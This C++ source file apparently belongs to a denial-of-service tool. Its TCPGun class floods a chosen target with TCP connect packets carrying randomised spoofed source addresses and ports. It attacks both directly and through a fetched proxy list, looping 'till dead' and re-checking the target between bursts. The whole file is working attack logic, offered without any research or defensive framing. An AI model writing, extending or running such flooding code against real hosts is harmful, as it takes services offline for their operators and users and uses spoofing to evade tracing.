#include <netdb.h>
#include <netinet/in.h>

#include "spdlog/spdlog.h"

#include "tcp_gun.h"

#include "api_interface.h"
#include "tcp_wrapper.h"
#include "config.h"
#include "utils.h"

using namespace Attackers;

std::size_t TCPGun::FireTillDead(const CURI &targetToKill) noexcept
{
	std::size_t hitsCount{0};

	SPDLOG_INFO("Firing TCP at {} without proxy", targetToKill);
	FireWithoutProxy(targetToKill, hitsCount);

	SPDLOG_INFO("Firing TCP at {} with proxy", targetToKill);
	FireWithProxy(targetToKill, hitsCount);

	return hitsCount;
}

bool TCPGun::FireWithoutProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
{
	// Checking connectivity over proxy, because packets would be send with randomized source

	auto resolvedAddress{m_attacker.CheckConnection(targetToKill, {})};
	while(!m_currentTask.ShouldStop())
	{
		if(resolvedAddress && ShootTarget(*resolvedAddress, hitsCount))
		{
			resolvedAddress = m_attacker.CheckConnection(targetToKill, {});
		}
	}
	return false;
}

void TCPGun::FireWithProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
{
	Informator informer;
	while(!m_currentTask.ShouldStop() && !informer.LoadNewData())
	{
	}

	std::optional<std::vector<Proxy>> proxies;
	while(!m_currentTask.ShouldStop() && !(proxies = informer.GetProxies()).has_value())
	{
	}

	// Checking connectivity over proxy, because packets would be send with randomized source
	auto resolvedAddress{m_attacker.CheckConnection(targetToKill, *proxies)};
	while(!m_currentTask.ShouldStop() && resolvedAddress)
	{
		ShootTarget(*resolvedAddress, hitsCount);
		resolvedAddress = m_attacker.CheckConnection(targetToKill, *proxies);
	}
}

bool TCPGun::ShootTarget(const CURI &targetToShoot, std::size_t &hitsCount)
{
	size_t count = 0;
	for(; count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK
			&& !m_currentTask.ShouldStop(); count++)
	{
		CURI fakeSource{GetRandomIP()};
		fakeSource.SetPort(GetRandomPort());
		TCPWrapper::TCPStatus sendStatus = m_attacker.SendConnectPacket(fakeSource, targetToShoot);

		if(sendStatus == TCPWrapper::TCPStatus::NeedConnectivityCheck ||
			sendStatus == TCPWrapper::TCPStatus::GotError)
		{
			hitsCount += count;
			SPDLOG_WARN("Something went wrong durring sending packet");
			return true;
		}
	}
	SPDLOG_INFO("Already sent: {} packets to {}, rechecking target...", count, 
		targetToShoot);
	hitsCount += count;
	return false;
}
